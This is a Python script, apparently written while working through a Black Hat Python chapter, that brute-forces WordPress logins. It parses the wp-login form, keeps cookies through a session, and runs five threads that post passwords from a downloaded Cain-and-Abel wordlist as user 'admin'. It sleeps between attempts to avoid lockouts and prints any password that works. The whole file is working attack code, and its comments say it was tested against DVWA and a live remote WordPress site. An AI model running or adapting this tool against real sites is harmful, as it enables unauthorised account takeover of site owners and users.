'''
This script is a brute forcer that uses the cain-and-abel.txt wordlist to brute force WordPress web applications
    - always take note of the input field "name" attribute as those need to be precise for each target
    - requests.Session() automatically handles the cookies for our session, so that anti-bf technique is bypassed
    - the other threads are stopped when a single thread has a successful login because they each check a shared object attribute during their loop, because they run as 
      part of the same object (Bruter)
'''
'''
Program flow for brute forcing WordPress web applications:
    1. Retrieve the login page and accept the cookies that are returned
    2. Parse out all of the form elements from the HTML
    3. Set the username/password to a guess from the dictionary
    4. Send an HTTP POST to the login processing script, including all HTML form fields and our stored cookies
    5. Test to see if we have successfully logged in to the web application
'''
'''
Testing parameter names were log/pwd and username/password
This script was tested against the OWASP DVWA as well as a live, remote WordPress instance (heaven forbid the default site location isn't 'localhost')
'''
'''
Wordlist source:
    - wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Software/cain-and-abel.txt
'''

from io import BytesIO
from lxml import etree
from queue import Queue

import requests
import sys
import threading
import time

SUCCESS = 'Welcome to WordPress!'                   # the presence of this string indicates our success
TARGET = "http://192.168.0.47/wp-login.php"
WORDLIST = "/home/ezra/blackHatPython/chapterFiveCode/BruteForcingDirectoriesAndFiles/cain-and-abel.txt"

def get_words():                                    # extract the words from the wordlist and make a Queue
    with open(WORDLIST) as f:
        raw_words = f.read()

    words = Queue()
    for word in raw_words.split('\n'):
        words.put(word)
    return words

def get_params(content):                            # parse the response (HTML), loop through the elements, and create a dictionary of the parameters we need to fill out
    params = dict()
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    for elem in tree.findall('//input'):                    # find all input elements
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    return params

class Bruter:                               # this is the brute forcing class; it will handle the requests and the cookies
    '''
    Since all threads are running in the same object, setting the self.found attribute to True will stop all threads, as phase 2 of web_bruter() will stop executing
    '''
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f"\nBrute Force Attack beginning on {url}.\n")
        print(f'Finished the setup where username = {username}\n')
    
    def run_bruteforce(self, passwords):
        for _ in range(5):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()

    def web_bruter(self, passwords):            # web_bruter() performs the actual login attempts; there are 3 phases

        session = requests.Session()            # initializing the requests.Session() object to automatically handle cookies
        resp0 = session.get(self.url)           # making the initial request to obtain the login form (for parsing)
        params = get_params(resp0.content)      # get_params() parses the raw HTML for parameters and returns a dictionary of all the form elements
        params['log'] = self.username           # changing the username parameter in the parameter dictionary

        while not passwords.empty() and not self.found:                         # phase 2 (if self.found is True, this will not execute)
            time.sleep(5)                                                       # sleep to avoid account lockouts
            passwd = passwords.get()                                            # pop a password off the queue to use for the current attempt
            print(f"Trying username/password {self.username}/{passwd:<10}")     # print attempt to the console
            params['pwd'] = passwd                                              # assigning the password value to the pwd key in the parameters dict

            resp1 = session.post(self.url, data=params)                                 # sending the POST request with the parameters as the body
            if SUCCESS in resp1.content.decode():                                       # if the success string is present
                self.found = True                                                       # set the found attribute to be True
                print(f"\nBruteforcing successful.")
                print(f"Username is ===> {self.username}")
                print(f"Password is ===> {passwd}\n")
                print('Done: Now cleaning up other threads. . .')

if __name__ == "__main__":
    words = get_words()
    b = Bruter('admin', TARGET)         # pass the username and the target URL as parameters
    b.run_bruteforce(words)             # run the Bruteforcer using a Queue of words made from the wordlist